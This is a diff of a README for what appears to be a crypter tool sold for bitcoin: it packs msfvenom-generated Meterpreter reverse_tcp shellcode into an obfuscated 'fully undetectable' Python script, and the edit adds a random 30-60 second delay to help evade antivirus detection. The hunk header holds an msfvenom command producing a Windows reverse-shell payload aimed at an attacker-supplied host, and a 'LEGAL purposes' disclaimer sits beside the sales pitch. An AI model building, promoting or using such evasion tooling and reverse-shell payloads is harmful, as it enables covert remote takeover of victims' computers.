@@ -11,6 +11,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f pytho
 
 You put the shellcode into the shellcode.py file, then you run the main.py script and get a fud python script, which you can compile to a exe file
 
-The output python script will always be different, because of the special obfuscator, so even if someone upload the script to virustotal, the new generated will not get detected. But pls dont upload ;) Only for LEGAL purposes!!!
+The output python script will always be different and takes a different delay between 30-60 seconds, because of the special obfuscator, so even if someone upload the script to virustotal, the new generated will not get detected. But pls dont upload ;) Only for LEGAL purposes!!!
 
 Write an email to back-oor@proton.me to buy it, payments via bitcoin!
